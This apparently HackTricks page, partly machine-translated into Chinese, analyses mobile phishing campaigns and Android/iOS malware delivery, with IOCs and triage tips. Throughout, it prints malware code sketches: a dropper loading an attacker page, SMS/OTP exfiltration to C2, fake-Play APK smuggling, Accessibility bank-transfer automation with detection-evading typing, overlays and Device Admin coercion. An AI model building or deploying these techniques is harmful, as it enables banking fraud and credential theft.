# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Register dozens of look-alike domains (dating, cloud share, car service…).
– Use local language keywords and emojis in the `<title>` element to rank in Google.
– Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
* On first run the app asks for an **invitation / verification code** (exclusive access illusion).
* The code is **POSTed over HTTP** to the Command-and-Control (C2).
* C2 replies `{"success":true}` ➜ malware continues.
* Sandbox / AV dynamic analysis that never submits a valid code sees **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions are only requested **after positive C2 response**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 introduced **Restricted settings** for sideloaded apps: Accessibility and Notification Listener toggles are greyed out until the user explicitly allows restricted settings in **App info**.
* Phishing pages and droppers now ship step‑by‑step UI instructions to **allow restricted settings** for the sideloaded app and then enable Accessibility/Notification access.
* A newer bypass is to install the payload via a **session‑based PackageInstaller flow** (the same method app stores use). Android treats the app as store‑installed, so Restricted settings no longer blocks Accessibility.
* Triage hint: in a dropper, grep for `PackageInstaller.createSession/openSession` plus code that immediately navigates the victim to `ACTION_ACCESSIBILITY_SETTINGS` or `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* App shows harmless views (SMS viewer, gallery picker) implemented locally.
* Meanwhile it exfiltrates:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
- Optional SMS content (`content://sms`)
Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads can **pin a phishing URL to the Home Screen** with a branded icon/label.
* Web Clips can run **full-screen** (hides the browser UI) and be marked **non-removable**, forcing the victim to delete the profile to remove the icon.
9. **Network Layer**
* Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Red-Team Tips

* **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 指标（通用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 通过 shortlink 进行动态 endpoint discovery
- Malware 从一个 shortlink 获取一个纯文本、逗号分隔的 live endpoints 列表；再通过简单的字符串转换生成最终的 phishing page path。

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### 基于 WebView 的 UPI 凭证收集
- “支付 ₹1 / UPI-Lite” 步骤会在 WebView 中从动态 endpoint 加载攻击者的 HTML form，并捕获敏感字段（phone、bank、UPI PIN），这些字段会被 `POST` 到 `addup.php`。

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自我传播和 SMS/OTP 拦截
- 首次运行时会请求激进的权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contacts 会被循环用于从受害者设备批量发送 smishing SMS。
- 收到的 SMS 会被一个 broadcast receiver 拦截，并连同元数据（sender、body、SIM slot、per-device random ID）一起上传到 `/addsm.php`。

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) 作为 resilient C2
- 载荷注册到 FCM；推送消息携带一个 `_type` 字段，作为 switch 来触发 actions（例如，更新 phishing text templates，切换 behaviours）。

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

为什么它能绕过简单控制：
- 没有暴露静态 APK URL；payload 是从 WebSocket frames 中在内存里重建的。
- 会阻止直接 .apk 响应的 URL/MIME/extension filters，可能会漏掉通过 WebSockets/Socket.IO 隧道传输的 binary data。
- 不执行 WebSockets 的 crawlers 和 URL sandboxes 无法获取 payload。

另请参见 WebSocket tradecraft 和 tooling：

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT campaign (ThreatFabric) 是一个具体示例，展示现代 mobile phishing operations 如何混合使用 WebView droppers、基于 Accessibility 的 UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover，甚至 NFC-relay orchestration。本节抽象出可复用的 techniques。

### Stage-1: WebView → native install bridge (dropper)
攻击者展示一个指向 attacker page 的 WebView，并注入一个 JavaScript interface，暴露一个 native installer。用户点击 HTML button 后，会调用 native code，安装 dropper 的 assets 中捆绑的 second-stage APK，然后直接启动它。

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

页面上的 HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
安装后，dropper 通过显式 package/activity 启动 payload：
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: 不受信任的 apps 调用 `addJavascriptInterface()` 并向 WebView 暴露类似 installer 的方法；APK 在 `assets/` 下携带内嵌 secondary payload，并调用 Package Installer Session API。

### Consent funnel: Accessibility + Device Admin + 后续运行时提示
Stage-2 打开一个托管“Access”页面的 WebView。其按钮调用一个导出的方法，将受害者导航到 Accessibility settings，并请求启用 rogue service。一旦获准，malware 使用 Accessibility 自动点击后续的 runtime permission dialogs（contacts、overlay、manage system settings 等），并请求 Device Admin。

- Accessibility 通过在 node-tree 中查找“Allow”/“OK”等按钮并触发点击，程序化地帮助接受后续提示。
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### 通过 WebView 的 Overlay phishing/ransom
Operators 可以发出命令：
- 从 URL 渲染一个全屏 overlay，或
- 传入 inline HTML，并将其加载到 WebView overlay 中。

可能用途：胁迫（PIN 输入）、打开 wallet 以捕获 PIN、ransom 消息。若缺少权限，保留一个命令以确保授予 overlay permission。

### Remote control model – 文本伪屏 + screen-cast
- 低带宽：周期性导出 Accessibility 节点树，序列化可见文本/roles/bounds，并作为伪屏发送到 C2（命令如 `txt_screen` 一次性和 `screen_live` 持续）。
- 高保真：按需请求 MediaProjection 并开始 screen-casting/recording（命令如 `display` / `record`）。

### ATS playbook（bank app automation）
给定一个 JSON task，打开 bank app，通过 Accessibility 结合 text queries 和 coordinate taps 操作 UI，并在提示时输入受害者的 payment PIN。

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- 使当前凭据过期以强制更改（Accessibility 捕获新的 PIN/password）：
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- 通过禁用 keyguard biometric 功能来强制使用非生物识别解锁：
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注意：许多 DevicePolicyManager 控制在较新的 Android 上需要 Device Owner/Profile Owner；某些 OEM 构建可能比较宽松。务必在目标 OS/OEM 上验证。

### NFC relay 编排（NFSkate）
Stage-3 可以安装并启动一个外部 NFC-relay 模块（例如 NFSkate），甚至把一个 HTML 模板交给它，用来在 relay 过程中引导受害者。这使得在 online ATS 之外，还能实现 contactless card-present cash-out。

背景: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### 基于 Accessibility 的 ATS 反检测：类人文本节奏与双文本注入（Herodotus）

威胁行为者越来越多地将基于 Accessibility 的自动化与针对基础行为生物特征调优的反检测手段结合起来。一个近期的 banker/RAT 展示了两种互补的文本传递模式，以及一个 operator 切换项，用于以随机化节奏模拟人类输入。

- Discovery mode: 使用 selectors 和 bounds 枚举可见节点，在执行前精确定位输入框（ID、text、contentDescription、hint、bounds）。
- 双文本注入：
- Mode 1 – 直接在目标节点上使用 `ACTION_SET_TEXT`（稳定，无需 keyboard）；
- Mode 2 – 先设置 clipboard，再对当前聚焦节点执行 `ACTION_PASTE`（在直接 setText 被阻止时可用）。
- 类人节奏：将 operator 提供的字符串拆分，并以逐字符方式发送，在事件之间加入随机的 300–3000 ms 延迟，以规避“machine-speed typing”启发式检测。可通过逐步增长 `ACTION_SET_TEXT` 的值，或一次只粘贴一个字符来实现。

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

用于 fraud cover 的阻挡 overlays：
- 渲染一个全屏 `TYPE_ACCESSIBILITY_OVERLAY`，由 operator 控制 opacity；在远程 automation 于下方继续运行时，让它对受害者保持不透明。
- 通常暴露的 commands：`opacityOverlay <0..255>`、`sendOverlayLoading <html/url>`、`removeOverlay`。

可调整 alpha 的最小 overlay：
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
常见的 Operator control primitives: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## 带有 WebView bridge、JNI 字符串解码器和分阶段 DEX 加载的多阶段 Android dropper

CERT Polska 于 2026 年 4 月 3 日对 **cifrat** 的分析，是现代 phishing 投递 Android loader 的一个很好的参考，其中可见的 APK 只是一个安装器外壳。可复用的 tradecraft 关键不在于家族名称，而在于各阶段的串联方式：

1. Phishing 页面投递一个诱饵 APK。
2. Stage 0 请求 `REQUEST_INSTALL_PACKAGES`，加载一个 native `.so`，解密一个嵌入的 blob，并通过 **PackageInstaller sessions** 安装 stage 2。
3. Stage 2 解密另一个隐藏资源，将其视为 ZIP，并为最终的 RAT **dynamically loads DEX**。
4. 最终阶段滥用 Accessibility/MediaProjection，并使用 WebSockets 进行 control/data。

### 作为安装器控制器的 WebView JavaScript bridge

诱饵不仅仅把 WebView 用于伪造品牌，还可以暴露一个 bridge，让本地/远程页面对设备进行 fingerprint 并触发 native 安装逻辑：
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage ideas:
- grep for `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` 和在同一个 activity 中使用的 remote phishing URLs
- watch for bridges exposing installer-like methods (`start`, `install`, `openAccessibility`, `requestOverlay`)
- if the bridge is backed by a phishing page, treat it as an operator/controller surface, not just UI

### `JNI_OnLoad` 中注册的 Native string decoding

一个有用的 pattern 是：某个 Java method 看起来无害，但实际上在 `JNI_OnLoad` 期间由 `RegisterNatives` 提供实现。在 cifrat 中，decoder 会忽略第一个字符，把第二个字符当作 1-byte XOR key，对剩余内容进行 hex-decoded，并将每个字节转换为 `((b - i) & 0xff) ^ key`。

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
当你看到以下情况时使用：
- 对 URL、包名或密钥反复调用同一个 native-backed Java method
- `JNI_OnLoad` 解析 classes 并调用 `RegisterNatives`
- DEX 里没有有意义的明文字符串，但很多短的、像 hex 的常量被传给同一个 helper

### 分层 payload staging：XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

这个家族使用了两层 unpacking，适合从通用角度去 hunting：

- **Stage 0**: 用通过 native decoder 派生出来的 XOR key 解密 `res/raw/*.bin`，然后通过 `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit` 安装明文 APK
- **Stage 2**: 提取一个看起来无害的 asset，例如 `FH.svg`，用 RC4-like routine 解密，按 ZIP 解析结果，然后加载隐藏的 DEX files

这是一个强烈的真实 dropper/loader pipeline 指标，因为每一层都会让下一阶段对基础静态扫描保持不可见。

快速 triage checklist:
- `REQUEST_INSTALL_PACKAGES` 加上 `PackageInstaller` session calls
- 用于在安装后继续链条的 `PACKAGE_ADDED` / `PACKAGE_REPLACED` receivers
- 位于 `res/raw/` 或 `assets/` 下、但扩展名不是媒体类型的加密 blobs
- `DexClassLoader` / `InMemoryDexClassLoader` / 靠近自定义 decryptors 的 ZIP 处理

### 通过 `/proc/self/maps` 的 native anti-debugging

native bootstrap 还会扫描 `/proc/self/maps` 中的 `libjdwp.so`，如果存在就中止。这是一个实用的早期 anti-analysis check，因为基于 JDWP 的调试会留下一个可识别的已映射 library:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
思路：
- grep native code / decompiler output for `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- if Frida hooks arrive too late, inspect `.init_array` and `JNI_OnLoad` first
- treat anti-debug + string decoder + staged install as one cluster, not independent findings

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
